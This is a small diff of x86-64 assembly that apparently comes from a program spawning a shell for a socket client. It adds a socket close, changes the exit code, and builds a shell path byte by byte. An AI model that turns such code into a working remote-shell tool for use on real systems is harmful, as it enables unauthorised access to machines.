@@ -146,6 +146,10 @@ _start:
 	cmp	rax, -1
 	je	_start_err
 
+	mov	rax, SYS_close
+	mov	edi, dword [rbp - sock_client]
+	syscall
+
 	mov	byte [rbp - sh_path + 0], '/'
 	mov	byte [rbp - sh_path + 1], 'u'
 	mov	byte [rbp - sh_path + 2], 's'
@@ -169,7 +173,7 @@ _start:
 	je	_start_err
 
 	mov	rax, SYS_exit
-	mov	rdi, 1
+	mov	rdi, 0
 	syscall
 
 _start_parent:
